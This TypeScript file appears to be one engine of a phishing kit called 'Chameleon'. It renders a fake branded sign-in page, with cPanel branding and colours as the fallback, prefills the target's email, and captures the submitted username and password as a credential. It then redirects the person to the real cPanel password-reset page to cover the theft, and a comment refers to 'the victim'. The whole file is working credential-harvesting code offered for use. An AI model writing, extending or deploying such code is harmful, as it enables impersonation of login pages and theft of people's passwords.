import { parseCredentialFields, type EngineCapture } from "@chameleon/contracts";
import { render as renderSkeleton } from "@chameleon/skeleton";
import type { Engine } from "./types";

const FALLBACK = {
  bg: "#f4f4f5",
  surface: "#ffffff",
  fg: "#18181b",
  accent: "#ff6c2f",
  radius: "6px",
  font: "system-ui, sans-serif",
} as const;

/**
 * Static render. Captures credentials only: no OTP field is ever rendered, because
 * the provider never sends the victim a code (INV-CAP-04).
 */
export const chameleon: Engine = {
  label: "Chameleon",
  code: "chameleon",
  captureKinds: ["credential"],
  defaultKind: "credential",

  async resolve(input) {
    // The caller has already run pin → brand map → profile → cPanel; without a
    // candidate this is the last resort.
    return {
      source: "cpanel",
      brandSlug: "cpanel",
      stepCount: 1,
      step: 1,
      prefilledEmail: input.email,
      redirectTo: "https://cpanel.net/password-reset",
      token: "unset",
      kind: "credential",
      title: "cPanel",
      palette: { ...FALLBACK },
      labels: {},
      logoUrl: null,
      backdropUrl: null,
    };
  },

  async render(template) {
    return renderSkeleton({
      brandSlug: template.brandSlug,
      title: template.title ?? template.brandSlug,
      heading: template.labels?.heading ?? "Sign in",
      emailLabel: template.labels?.email ?? "Email",
      passwordLabel: template.labels?.password ?? "Password",
      submitLabel: template.labels?.submit ?? "Sign in",
      palette: {
        bg: template.palette?.bg ?? FALLBACK.bg,
        surface: template.palette?.surface ?? FALLBACK.surface,
        fg: template.palette?.fg ?? FALLBACK.fg,
        accent: template.palette?.accent ?? FALLBACK.accent,
        radius: template.palette?.radius ?? FALLBACK.radius,
        font: template.palette?.font ?? FALLBACK.font,
      },
      logoRef: template.logoUrl ?? null,
      backdropRef: template.backdropUrl ?? null,
      prefilledEmail: template.prefilledEmail,
      stepCount: template.stepCount,
      step: template.step,
      token: template.token,
      action: template.action,
      kind: template.kind,
    });
  },

  parseCapture(form): EngineCapture {
    const fields = parseCredentialFields({
      username: form.email ?? form.username,
      password: form.password,
    });
    return { kind: "credential", fields };
  },

  redirectTarget(template) {
    return template.redirectTo;
  },
};
